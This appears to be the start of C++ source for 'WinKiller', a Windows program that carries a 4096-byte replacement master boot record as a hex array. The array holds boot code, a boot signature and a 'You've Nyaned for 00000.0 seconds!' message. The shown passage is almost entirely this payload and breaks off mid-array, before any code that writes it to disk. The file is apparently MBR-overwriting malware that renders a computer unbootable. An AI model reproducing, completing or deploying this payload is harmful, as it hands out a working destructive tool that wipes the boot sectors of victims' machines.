// WinKiller.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <cstdio>
#include <winioctl.h>
#include <conio.h>
#include <string>
#include <iostream>
#include <ctime>
#include <fstream>

using namespace std;

#define _KEY
// #define _BOOT

const BYTE WinKillerMBR[4096] = {
	0xEA,0x05,0x7C,0x00,0x00,0xFA,0x31,0xC0,0x8E,0xD0,0xBC,0xF0,0x7B,0xFB,0xBB,0x00,
	0x10,0x8E,0xC3,0xB8,0x08,0x02,0xB9,0x02,0x00,0xB6,0x00,0x31,0xDB,0xCD,0x13,0x06,
	0x1F,0xB8,0x00,0x20,0x8E,0xC0,0x31,0xC0,0x89,0xC3,0x89,0xC1,0x89,0xC2,0x89,0xC7,
	0x89,0xC6,0xAC,0x81,0xFE,0x1E,0x0B,0x73,0x2F,0x3C,0x80,0x73,0x02,0xEB,0x0F,0x24,
	0x7F,0x88,0xC1,0xAC,0xAA,0xFE,0xC9,0x80,0xF9,0xFF,0x75,0xF7,0xEB,0xE4,0x88,0xC4,
	0xAC,0x89,0xC3,0xAC,0x1E,0x68,0x00,0x20,0x1F,0x89,0xF2,0x89,0xDE,0x88,0xC1,0xAC,
	0xAA,0xE2,0xFC,0x89,0xD6,0x1F,0xEB,0xCA,0xB8,0x00,0x20,0x8E,0xD8,0x8E,0xC0,0xEA,
	0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,
	0xFF,0xFF,0x05,0xFE,0xFF,0xFF,0x00,0x04,0x00,0x00,0x00,0xF0,0x25,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0xAA,
	0xA4,0xB8,0x03,0x00,0xCD,0x10,0xB8,0x03,0x10,0xB3,0x00,0xCD,0x10,0xB0,0x34,0xE6,
	0x43,0xE8,0x92,0x00,0xFA,0x1E,0x6A,0x00,0x1F,0xC7,0x06,0x20,0x00,0x53,0x00,0xC7,
	0x06,0x22,0x00,0x00,0x20,0x1F,0x00,0x14,0x06,0x86,0x24,0x00,0x93,0x00,0xC7,0x06,
	0x26,0x00,0x21,0x04,0xB9,0xFB,0xB0,0xB6,0xE6,0x43,0xB8,0xA9,0x04,0xE6,0x42,0x88,
	0xE0,0xE6,0x42,0xE4,0x61,0x0C,0x03,0xE6,0x61,0xE8,0x1A,0x01,0xF4,0xEB,0xFD,0x00,
	0x00,0x00,0x60,0xFE,0x06,0x50,0x00,0x80,0x3E,0x50,0x00,0x08,0x75,0x08,0xC6,0x06,
	0x50,0x00,0x00,0xE8,0xC2,0x00,0xFE,0x06,0x51,0x00,0x80,0x3E,0x51,0x00,0x0C,0x00,
	0x5D,0x04,0x8E,0x51,0x00,0x00,0xE8,0x63,0x01,0xFE,0x06,0x52,0x00,0x80,0x3E,0x52,
	0x00,0x0A,0x00,0x70,0x04,0x94,0x52,0x00,0x00,0xE8,0x62,0x00,0xB0,0x20,0xE6,0x20,
	0x61,0xCF,0x60,0xE4,0x60,0x3C,0x1F,0x75,0x03,0xE8,0x12,0x00,0x8C,0x07,0xEE,0x9C,
	0x2E,0xA1,0xA3,0x00,0xE6,0x40,0x88,0xE0,0xE6,0x40,0xC3,0xA1,0xA3,0x00,0xBB,0x02,
	0x00,0xF7,0xE3,0xBB,0x03,0x00,0xF7,0xF3,0x3D,0xC4,0x07,0x77,0x03,0xB8,0xD4,0x8B,
	0xA3,0xA3,0x00,0xE8,0xDB,0xFF,0xC3,0x59,0x6F,0x75,0x27,0x76,0x65,0x20,0x4E,0x79,
	0x61,0x6E,0x65,0x64,0x20,0x66,0x6F,0x72,0x20,0x30,0x30,0x30,0x30,0x30,0x2E,0x30,
	0x20,0x73,0x65,0x63,0x6F,0x6E,0x64,0x73,0x21,0x00,0x00,0x06,0x68,0x00,0xB8,0x07,
	0xBF,0x00,0x00,0xFF,0x06,0xED,0x00,0xBB,0x44,0x00,0x83,0xEB,0x02,0x26,0x8A,0x87,
	0x00,0x0F,0x3C,0x30,0x72,0x16,0x3C,0x39,0x77,0x12,0xFE,0xC0,0x26,0x88,0x01,0x03,
	0x04,0x84,0x3A,0x75,0x0C,0xB0,0x30,0x01,0x10,0x05,0x86,0x83,0xFB,0x00,0x75,0xD9,
	0x07,0xC3,0x00,0xED,0x0A,0xB5,0x8B,0x36,0x27,0x01,0x81,0x3E,0xDA,0x01,0xD1,0x67,
	0x77,0x17,0x75,0x10,0xBE,0x0D,0x02,0xBF,0x00,0x00,0xB9,0x4C,0x00,0xB8,0xDC,0x00,
	0xF3,0xAB,0xEB,0x05,0xE8,0x38,0x00,0xEB,0x11,0xE8,0x5A,0x00,0x81,0x3E,0x27,0x01,
	0xCD,0x5F,0x72,0x06,0xC7,0x06,0x27,0x01,0x0D,0x02,0x07,0xC3,0x01,0x29,0x08,0x98,
	0xB8,0xDC,0x00,0xB9,0x80,0x07,0xF3,0xAB,0xB9,0x22,0x00,0xBE,0xCB,0x00,0xAC,0xAB,
	0xE2,0xFC,0xB0,0xDC,0xB9,0x2E,0x00,0xF3,0xAB,0x01,0x65,0x07,0x00,0x5F,0x04,0x9B,
	0x05,0x83,0xFE,0x4C,0x73,0x16,0x89,0xF7,0x6B,0xFF,0x02,0x8A,0x84,0x79,0x69,0x26,
	0x88,0x05,0x26,0xC6,0x45,0x01,0xF0,0x46,0x89,0x36,0x27,0x01,0x01,0x88,0x07,0x87,
	0xA1,0xED,0x00,0xBA,0x00,0x00,0xBB,0x0A,0x00,0xB9,0x04,0x91,0xA4,0x01,0x75,0x03,
	0xBE,0xCD,0x5F,0xBF,0x01,0x00,0xB9,0xD0,0x07,0xAC,0xAA,0x47,0xE2,0xFB,0x01,0xAB,
	0x06,0xA0,0x9D,0x67,0x00,0x8B,0x36,0xDA,0x01,0x81,0xFE,0x79,0x69,0x72,0x03,0xBE,
	0xD1,0x67,0xFE,0x0E,0xDC,0x01,0x80,0x3E,0xDC,0x01,0xFF,0x75,0x17,0xAD,0x89,0xC1,
	0x80,0xE4,0x1F,0x00,0x3E,0x06,0x8F,0xC0,0xED,0x05,0x88,0x2E,0xDC,0x01,0x89,0x36,
	0xDA,0x01,0xC3,0x11,0x11,0x11,0x11,0x02,0x0D,0x04,0x02,0x0D,0x08,0x02,0x0D,0x10,
	0x02,0x0D,0x20,0x02,0x42,0x0B,0x83,0xF1,0xF1,0x11,0xF1,0x02,0x0D,0x4B,0x02,0xA3,
	0x04,0x80,0xFF,0x02,0x5C,0x4F,0x02,0xAC,0x4F,0x02,0xF7,0x53,0x82,0x1F,0xF1,0x1F,
	0x03,0x4F,0x4E,0x02,0x5B,0x50,0x04,0x1F,0x1F,0x83,0x10,0x10,0x10,0x10,0x04,0x5D,
	0x04,0x04,0x5D,0x08,0x80,0x10,0x04,0x3E,0x1F,0x83,0x14,0x14,0x14,0x14,0x04,0x8D,
	0x04,0x83,0x44,0x44,0x44,0x44,0x04,0x95,0x04,0x04,0x8D,0x0E,0x87,0x40,0x0E,0xEE,
	0xEE,0xED,0xED,0xED,0xED,0x04,0xAF,0x04,0x04,0xB2,0x05,0x82,0xEE,0xEE,0x0E,0x04,
	0x6D,0x1E,0x04,0x95,0x08,0x83,0x46,0x46,0x46,0x46,0x04,0xE5,0x04,0x04,0xDD,0x0E,
	0x8C,0x00,0xEE,0xED,0xDD,0xDC,0xDD,0xDD,0xDD,0xDD,0xCD,0xDD,0xDD,0xCD,0x05,0x00,
	0x04,0x83,0xDD,0xED,0xEE,0x00,0x04,0xC0,0x1D,0x83,0x66,0x66,0x66,0x66,0x05,0x2D,
	0x04,0x05,0x2D,0x08,0x05,0x2F,0x0E,0x81,0x00,0xEE,0x05,0x08,0x05,0x05,0x4E,0x04,
	0x83,0xD0,0x07,0x07,0xD0,0x05,0x06,0x04,0x84,0xEE,0x00,0x10,0x07,0x07,0x04,0xBF,
	0x1A,0x83,0x6E,0x6E,0x6E,0x6E,0x05,0x7D,0x04,0x83,0xEE,0xEE,0xEE,0xEE,0x05,0x85,
	0x04,0x05,0x7D,0x08,0x85,0x00,0x07,0x07,0x00,0xE0,0xEE,0x05,0x4B,0x08,0x8F,0xCD,
	0xDD,0xDD,0x00,0x77,0x77,0x77,0x07,0xD0,0xD0,0xD0,0xE0,0x07,0x77,0x77,0x77,0x05,
	0x0F,0x1A,0x05,0x85,0x08,0x83,0xEA,0xEA,0xEA,0xEA,0x05,0xD5,0x04,0x05,0xCD,0x08,
	0x85,0x0A,0x00,0x70,0x77,0x07,0x00,0x05,0x9B,0x05,0x05,0x07,0x04,0x81,0xDC,0xD0,
	0x05,0xAF,0x04,0x80,0x77,0x05,0xF7,0x04,0x05,0xFB,0x04,0x05,0x62,0x1A,0x83,0xAA,
	0xAA,0xAA,0xAA,0x06,0x1D,0x04,0x06,0x1D,0x08,0x06,0x23,0x0A,0x85,0x0A,0x00,0x70,
	0x70,0x00,0xEE,0x05,0x06,0x07,0x05,0xA5,0x05,0x80,0xF0,0x06,0x45,0x04,0x80,0x70,
	0x06,0x48,0x05,0x05,0xB3,0x19,0x83,0xA3,0xA3,0xA3,0xA3,0x06,0x6D,0x04,0x83,0x33,
	0x33,0x33,0x33,0x06,0x75,0x04,0x06,0x6D,0x0D,0x83,0x03,0x00,0xEE,0xDE,0x04,0xFE,
	0x04,0x05,0xA3,0x07,0x81,0x77,0x70,0x06,0x4C,0x04,0x06,0x99,0x04,0x06,0x53,0x1A,
	0x06,0x75,0x08,0x87,0x39,0x39,0x39,0x39,0xF9,0x39,0x39,0x39,0x06,0xBD,0x0C,0x9A,
	0x39,0x30,0x00,0xE0,0xEE,0xEE,0xDE,0xDE,0xDE,0xDE,0xDE,0xDE,0xDE,0x0E,0x70,0x77,
	0x77,0x07,0x07,0x07,0x07,0x07,0x07,0x07,0x77,0x70,0x01,0x05,0xB4,0x19,0x83,0x99,
	0x99,0x99,0x99,0x07,0x0D,0x04,0x81,0x99,0x9F,0x07,0x11,0x06,0x07,0x0D,0x09,0x88,
	0x99,0x99,0x99,0x00,0x77,0x77,0x70,0x00,0x01,0x05,0x95,0x04,0x83,0x01,0x01,0x01,
	0x01,0x07,0x2E,0x06,0x07,0x38,0x05,0x05,0x12,0x1B,0x83,0x91,0x91,0x91,0x91,0x07,
	0x5D,0x04,0x07,0x55,0x10,0x07,0x69,0x04,0x07,0x34,0x04,0x07,0x77,0x05,0x07,0x66,
	0x07,0x07,0x7A,0x07,0x03,0xC5,0x98,0x02,0xAC,0xF1,0x08,0xA6,0x73,0x84,0xF1,0x1F,
	0x1F,0x1F,0x1F,0x09,0x8D,0x04,0x09,0x8D,0x08,0x09,0x8D,0x10,0x80,0x1F,0x03,0x9F,
	0x4F,0x07,0x97,0x28,0x07,0xB9,0x4B,0x82,0xF1,0x11,0x1F,0x07,0xB8,0xFF,0x0A,0xB7,
	0xBB,0x04,0x5D,0xF9,0x05,0x55,0x05,0x05,0x5B,0x05,0x80,0x11,0x05,0x60,0x1C,0x05,
	0x7D,0x18,0x84,0xEE,0xE0,0xE0,0xEE,0xEE,0x05,0x9A,0x0C,0x05,0xA5,0x08,0x81,0xE0,
	0x00,0x05,0xAF,0x1D,0x05,0xCD,0x18,0x06,0x51,0x04,0x81,0xE0,0xE0,0x05,0xEB,0x0A,
	0x80,0xDD,0x05,0xF5,0x27,0x06,0x1E,0x1A,0x83,0x70,0x70,0x77,0x77,0x06,0x3B,0x0A,
	0x06,0x44,0x28,0x06,0x6D,0x1C,0x80,0x03,0x06,0x8A,0x0B,0x06,0x94,0x28,0x06,0xCD,
	0x0D,0x06,0xCA,0x10,0x80,0x39,0x06,0xDB,0x0B,0x06,0xE5,0x27,0x07,0x1D,0x0C,0x0E,
	0xDD,0x0C,0x07,0x24,0x08,0x07,0x2D,0x0B,0x07,0x37,0x25,0x07,0x6F,0x06,0x80,0xF1,
	0x07,0x64,0x15,0x07,0x7E,0x07,0x07,0x7F,0x11,0x07,0x8F,0x2A,0x07,0xBA,0xFF,0x08,
	0xBE,0xCF,0x03,0x99,0x05,0x09,0x8E,0x88,0x0A,0x1F,0x51,0x81,0x11,0x11,0x09,0xAE,
	0x71,0x03,0x0B,0x93,0x11,0x97,0x55,0x02,0x11,0x9B,0x0C,0x66,0x15,0x14,0x32,0x0A,
	0x84,0x10,0x0E,0x0E,0x0E,0x0E,0x14,0x4D,0x04,0x14,0x4D,0x08,0x0C,0x8E,0x1F,0x80,
	0x11,0x0C,0xB6,0x15,0x14,0x82,0x09,0x83,0x00,0xEE,0xEE,0xED,0x0E,0x11,0x05,0x80,
	0xDC,0x0D,0xC2,0x04,0x0C,0xDA,0x05,0x0C,0xDE,0x41,0x0E,0x0E,0x08,0x82,0xDD,0xD0,
	0xD0,0x14,0xA6,0x04,0x14,0xAE,0x04,0x0C,0x3C,0x1B,0x0D,0x56,0x10,0x15,0x1D,0x0E,
	0x0D,0x6B,0x08,0x14,0xA7,0x04,0x80,0x00,0x0D,0x79,0x04,0x05,0x5C,0x06,0x0D,0x82,
	0x1B,0x0D,0xA6,0x0F,0x0D,0xA5,0x0F,0x15,0x3B,0x05,0x14,0xA7,0x05,0x0E,0x64,0x07,
	0x0E,0xBE,0x05,0x0D,0x81,0x1C,0x06,0x1D,0x1A,0x82,0xA0,0xA0,0xA0,0x05,0xEA,0x04,
	0x15,0x90,0x06,0x80,0xCD,0x15,0x96,0x05,0x80,0x7F,0x0E,0x71,0x04,0x15,0xE8,0x06,
	0x0E,0x75,0x1F,0x0E,0x3D,0x11,0x0D,0x7F,0x04,0x06,0x39,0x05,0x15,0x3F,0x0B,0x80,
	0x77,0x15,0x9E,0x05,0x80,0x07,0x16,0x39,0x05,0x15,0xF5,0x18,0x0E,0x96,0x15,0x16,
	0x62,0x04,0x88,0x03,0x03,0x03,0x03,0x33,0x00,0xEE,0xEE,0xDE,0x14,0xEF,0x07,0x80,
	0x0D,0x0E,0x71,0x05,0x81,0x70,0x70,0x06,0x38,0x04,0x80,0x77,0x0E,0xC2,0x1A,0x07,
	0x1B,0x0E,0x0E,0xEA,0x11,0x84,0x07,0xE0,0xE0,0xE0,0xE0,0x16,0xCD,0x04,0x87,0xE0,
	0xE0,0xE0,0x00,0x70,0x70,0x70,0x70,0x16,0xD9,0x04,0x80,0x70,0x06,0xF2,0x1B,0x81,
	0xF1,0x1F,0x13,0xDC,0x05,0x07,0x5D,0x17,0x80,0x00,0x16,0xE1,0x04,0x82,0x01,0x70,
	0x70,0x16,0x45,0x07,0x17,0x20,0x05,0x17,0x20,0x0A,0x07,0xBA,0xFF,0x11,0xEF,0xE7,
	0x11,0xE6,0x0E,0x11,0x5D,0x45,0x18,0x82,0x40,0x07,0xB9,0xFF,0x18,0x30,0xA0,0x19,
	0xB2,0x04,0x0A,0x25,0x4D,0x0A,0x21,0x5B,0x14,0x2D,0xFF,0x15,0x2C,0xAD,0x81,0x07,
	0x07,0x15,0xDB,0x4A,0x83,0xA0,0x07,0x77,0x70,0x16,0x29,0x4C,0x84,0x03,0x70,0x70,
	0x03,0x33,0x16,0x7A,0x34,0x16,0xAF,0x1C,0x81,0x90,0x07,0x16,0xCC,0x31,0x07,0x56,
	0x1D,0x17,0x1B,0xFF,0x1A,0xA4,0xFF,0x20,0x97,0x15,0x19,0x2D,0x39,0x0A,0x70,0x46,
	0x16,0xFD,0x07,0x07,0xBA,0xFF,0x18,0x3A,0xF3,0x22,0x85,0x58,0x0C,0x5D,0x1E,0x81,
	0x44,0x40,0x1C,0x1D,0x30,0x0C,0xAD,0x20,0x1C,0x6D,0x5A,0x81,0xD0,0xD0,0x24,0x45,
	0x05,0x0D,0x2E,0x04,0x23,0xFE,0x1B,0x0D,0x4D,0x19,0x1D,0x56,0x0A,0x24,0x41,0x06,
	0x1D,0x17,0x07,0x81,0xDD,0xEE,0x16,0x25,0x04,0x05,0xB3,0x31,0x81,0xE0,0x07,0x05,
	0x96,0x04,0x0D,0xBA,0x06,0x1D,0xAE,0x06,0x1D,0x67,0x26,0x1D,0x8C,0x18,0x81,0x0A,
	0x0A,0x1E,0xAF,0x04,0x1D,0xAA,0x0B,0x1D,0xB6,0x27,0x0E,0x3C,0x21,0x24,0xDE,0x0B,
	0x1E,0x09,0x24,0x0E,0x8C,0x1E,0x80,0x30,0x1E,0x4B,0x0A,0x1E,0x56,0x27,0x1E,0x7C,
	0x1C,0x80,0x90,0x25,0x25,0x06,0x1E,0xA0,0x2E,0x07,0x5D,0x1B,0x17,0x1B,0xFF,0x12,
	0xE6,0xF8,0x80,0xF1,0x28,0x5D,0x1D,0x20,0xFD,0x30,0x02,0xAB,0x47,0x82,0xF1,0xF1,
	0x1F,0x28,0xAF,0x1E,0x19,0x81,0xFF,0x10,0x89,0xD4,0x2A,0xCE,0x65,0x23,0xCD,0xC9,
	0x05,0x56,0x05,0x24,0x9B,0x05,0x05,0x60,0x35,0x0D,0x65,0x0E,0x25,0xD2,0x08,0x05,
	0xAB,0x3A,0x0D,0xB5,0x0B,0x2C,0x17,0x05,0x05,0xF5,0x41,0x0E,0x06,0x08,0x25,0x7E,
	0x0B,0x06,0x49,0x40,0x25,0xC9,0x10,0x06,0x99,0x30,0x26,0x09,0x1C,0x26,0x24,0x05,
	0x0E,0xBB,0x22,0x80,0x1F,0x26,0x4D,0x1D,0x80,0x77,0x26,0x6B,0x0C,0x86,0xE0,0x00,
	0x00,0x00,0x00,0x00,0x00,0x0F,0x01,0x04,0x2B,0x19,0x1B,0x26,0x9D,0x20,0x2E,0x88,
	0x05,0x2E,0x78,0x05,0x26,0xB8,0x0F,0x02,0x45,0xFF,0x2F,0x26,0x7F,0x2F,0x0C,0x4E,
	0x29,0x44,0x2B,0x28,0xCD,0x27,0x2E,0xBC,0x46,0x28,0xAA,0x23,0x02,0x7B,0xFF,0x27,
	0x8B,0xD1,0x21,0x7C,0x40,0x0C,0x2D,0x30,0x1B,0xFD,0x1E,0x80,0x10,0x0C,0x7C,0x31,
	0x1C,0x4D,0x20,0x04,0xFD,0x80,0x1C,0xED,0x18,0x0F,0x0E,0x04,0x80,0x60,0x1D,0x0A,
	0x09,0x05,0xA3,0x2A,0x1D,0x3D,0x18,0x80,0x0E,0x05,0xE6,0x87,0x1D,0xDD,0x18,0x35,
	0x57,0x05,0x06,0x8A,0x33,0x16,0x5D,0x19,0x35,0xA8,0x04,0x06,0xDA,0x29,0x32,0xAE,
	0x0A,0x0E,0xDE,0x1F,0x07,0x2C,0x25,0x20,0x96,0x13,0x2E,0x6D,0x15,0x07,0x79,0x27,
	0x0A,0x1F,0xFF,0x32,0x40,0xEE,0x11,0x5D,0x63,0x0A,0x1F,0xFF,0x2F,0x7B,0xFF,0x0B,
	0xEE,0x4A,0x80,0xF0,0x33,0x49,0xED,0x0D,0x26,0x27,0x1C,0xED,0x19,0x81,0x60,0x60,
	0x1D,0x08,0x0B,0x0D,0x73,0x2A,0x34,0xAD,0x18,0x0D,0xB5,0x88,0x35,0x4D,0x1C,0x0E,
	0x59,0x34,0x35,0x9D,0x1D,0x80,0x33,0x0E,0xAB,0x1F,0x38,0x8E,0x13,0x0E,0xDD,0x50,
	0x26,0x96,0x1D,0x0F,0x4A,0x1D,0x11,0xE6,0xFF,0x2A,0x70,0xF7,0x38,0x6D,0x59,0x11,
	0xE6,0xFF,0x27,0xB3,0xFF,0x3A,0x2D,0x79,0x23,0xCD,0xCA,0x1C,0xC7,0x26,0x24,0xBD,
	0x29,0x1D,0x16,0x27,0x2C,0xDD,0x18,0x44,0x57,0x06,0x15,0x8B,0x82,0x2D,0x7D,0x18,
	0x16,0x25,0x38,0x2D,0xCD,0x19,0x84,0x09,0x09,0x09,0x09,0x39,0x1E,0x4B,0x4F,0x16,
	0xCA,0x33,0x07,0x5D,0x1C,0x26,0xB6,0x15,0x80,0xF1,0x17,0x2F,0xFF,0x22,0xA6,0xFF,
	0x40,0x3D,0x55,0x07,0xB9,0xFF,0x1A,0xAF,0xFF,0x38,0xDE,0x7D,0x43,0x0D,0xFF,0x44,
	0x0C,0xAD,0x1D,0xA9,0x34,0x44,0xED,0x18,0x80,0x30,0x1D,0xF6,0x37,0x45,0x3D,0x18,
	0x84,0x09,0x70,0x70,0x09,0x39,0x45,0x5A,0x50,0x1E,0x9A,0x33,0x45,0xDD,0x1D,0x45,
	0xFB,0x0C,0x82,0xF1,0xF1,0x1F,0x26,0xC7,0x4F,0x48,0x62,0xD1,0x49,0xB5,0xE4,0x48,
	0x25,0x0A,0x80,0xF0,0x4F,0xE4,0x04,0x48,0x1C,0x41,0x21,0x7D,0xFF,0x22,0x7C,0xFF,
	0x51,0x3B,0x82,0x1B,0xFD,0xCA,0x24,0x97,0x26,0x1C,0xED,0x29,0x24,0xE6,0x27,0x3C,
	0x7D,0x17,0x25,0x24,0x89,0x3D,0x1D,0x20,0x25,0xCD,0x30,0x35,0x9D,0x1F,0x26,0x1C,
	0x81,0x4D,0xA6,0x1B,0x4D,0xCA,0x04,0x46,0x0E,0x05,0x42,0x91,0x06,0x4D,0xD9,0x48,
	0x31,0x5D,0xD0,0x41,0xEF,0x9D,0x42,0x8E,0x04,0x42,0x90,0x4D,0x4F,0xE9,0x16,0x09,
	0xA3,0x7C,0x07,0xBA,0xFF,0x2A,0x8E,0xFF,0x52,0x6D,0xFF,0x2C,0x5C,0x31,0x3C,0x2D,
	0x26,0x2C,0xB3,0x2A,0x3C,0x7D,0x23,0x2D,0x00,0x7D,0x54,0x8D,0x2C,0x35,0x79,0x3B,
	0x80,0x3F,0x54,0xF5,0x10,0x2D,0xF5,0x27,0x55,0x2C,0x16,0x80,0xF9,0x5D,0x0F,0x04,
	0x2E,0x37,0x35,0x55,0x7C,0x15,0x80,0xF1,0x5D,0x52,0x05,0x80,0xF1,0x2E,0x88,0x31,
	0x0A,0x57,0xFF,0x59,0x9D,0x97,0x5E,0xDE,0x4E,0x57,0xAE,0x21,0x57,0xCE,0x2F,0x83,
	0xFF,0xFF,0xFF,0xFF,0x5F,0xCD,0x04,0x5F,0xCD,0x08,0x5F,0xCD,0x10,0x5F,0xE5,0x08,
	0x81,0x22,0x22,0x5F,0xCD,0x28,0x5F,0xD0,0x4F,0x60,0x49,0x25,0x81,0xF2,0x22,0x60,
	0x44,0x3C,0x80,0x2F,0x60,0x96,0x10,0x60,0x93,0x04,0x81,0x22,0xF2,0x60,0x0A,0x3C,
	0x60,0xE7,0x0E,0x60,0xE3,0x04,0x60,0x95,0x3E,0x61,0x22,0x0E,0x61,0x32,0x13,0x81,
	0xF2,0xF2,0x61,0x37,0x2C,0x61,0x83,0x05,0x61,0x76,0x09,0x60,0xE2,0x05,0x61,0x86,
	0x0C,0x84,0xF2,0xF2,0x22,0x22,0x2F,0x60,0xF6,0x2E,0x61,0xC3,0x0C,0x62,0x13,0x07,
	0x61,0xDB,0x0B,0x61,0x35,0x31,0x62,0x13,0x0D,0x62,0x21,0x0C,0x62,0x2F,0x07,0x61,
	0x37,0x30,0x61,0x72,0x04,0x62,0x80,0x09,0x62,0xB6,0x0A,0x62,0x7E,0x07,0x61,0xE5,
	0x2E,0x62,0xAF,0x11,0x63,0x07,0x09,0x62,0xCB,0x3A,0x63,0x03,0x0B,0x80,0xF2,0x63,
	0x10,0x09,0x63,0x57,0x08,0x63,0x22,0x2B,0x86,0x2F,0x22,0x22,0xF2,0xF2,0xF2,0xF2,
	0x62,0x6B,0x04,0x63,0x56,0x0A,0x63,0xA8,0x08,0x63,0x1C,0x34,0x63,0xA7,0x09,0x82,
	0x22,0xF2,0xF2,0x63,0xED,0x0A,0x63,0xB4,0x39,0x62,0xBD,0x0B,0x63,0xAD,0x12,0x62,
	0xC4,0x08,0x63,0x9F,0x05,0x64,0x60,0x06,0x63,0xA2,0x05,0x63,0xCD,0x21,0x63,0xF9,
	0x15,0x63,0xF2,0x07,0x64,0x00,0x0F,0x64,0x0E,0x27,0x64,0x91,0x1B,0x64,0xB4,0x30,
	0x64,0xDC,0x0A,0x64,0xE5,0x1A,0x80,0x2F,0x65,0x07,0x30,0x62,0x7B,0x0A,0x64,0x9B,
	0x12,0x60,0x5F,0x38,0x64,0xED,0x1A,0x65,0x9F,0x2F,0x63,0x1A,0x09,0x82,0x2F,0x2F,
	0x2F,0x66,0x21,0x06,0x82,0x2F,0x22,0x22,0x65,0x39,0x0F,0x65,0xF2,0x2C,0x65,0x53,
	0x0B,0x64,0x09,0x08,0x64,0x5B,0x04,0x61,0x72,0x05,0x66,0x29,0x04,0x65,0x38,0x06,
	0x65,0x9F,0x34,0x64,0x0C,0x0A,0x64,0x5B,0x05,0x80,0x2F,0x62,0x83,0x0B,0x65,0x54,
	0x32,0x60,0x37,0x35,0x83,0xF0,0xF0,0xF0,0xF0,0x67,0x4D,0x04,0x67,0x4D,0x08,0x67,
	0x4D,0x10,0x81,0xF0,0xF0,0x67,0x1F,0x2E,0x87,0x7E,0x07,0x12,0x07,0x4C,0x26,0xB8,
	0x24,0x67,0x9D,0x05,0x8E,0x06,0xB8,0x04,0x34,0x04,0xBF,0x03,0x34,0x04,0x00,0x05,
	0xB8,0x24,0x4C,0x26,0x67,0x9D,0x08,0x67,0xB1,0x05,0xA0,0x04,0x34,0x04,0x89,0x03,
	0xBF,0x03,0x89,0x03,0x34,0x04,0x4C,0x26,0x9D,0x25,0x7E,0x07,0x7E,0x07,0x70,0x29,
	0xF0,0x07,0x68,0x08,0x70,0x09,0x70,0x49,0x68,0x28,0xF0,0x27,0x67,0xDB,0x06,0x87,
	0x68,0x08,0x7E,0x07,0x4C,0x06,0x9D,0x05,0x67,0xEF,0x04,0x67,0xED,0x04,0x67,0xEB,
	0x04,0x85,0x70,0x09,0x7E,0x27,0x4C,0x26,0x67,0xF3,0x0C,0x83,0xF0,0x07,0x7E,0x07,
	0x67,0xE7,0x08,0x81,0xF0,0x27,0x67,0xEB,0x08,0x68,0x23,0x04,0x68,0x19,0x05,0x84,
	0x28,0x70,0x29,0x68,0x28,0x67,0xD1,0x66,0x85,0x70,0x29,0x99,0x0C,0x39,0x0B,0x68,
	0x9D,0x06,0x68,0x87,0x06,0x83,0x70,0x09,0x12,0x07,0x67,0xA5,0x06,0x81,0x70,0x29,
	0x68,0xA3,0x08,0x81,0x99,0x0C,0x68,0xB1,0x04,0x68,0x93,0x04,0x87,0x99,0x0C,0xFB,
	0x0E,0x24,0x0E,0x99,0x0C,0x68,0x9D,0x0E,0x68,0xA9,0x08,0x68,0xDD,0x04,0x68,0xD3,
	0x04,0x83,0x70,0x09,0x00,0x0A,0x68,0xE9,0x06,0x68,0xAF,0x0C,0x81,0x00,0x2A,0x68,
	0x9D,0x6C,0xBC,0x68,0x28,0x59,0x6F,0x75,0x72,0x20,0x63,0x6F,0x6D,0x70,0x75,0x74,
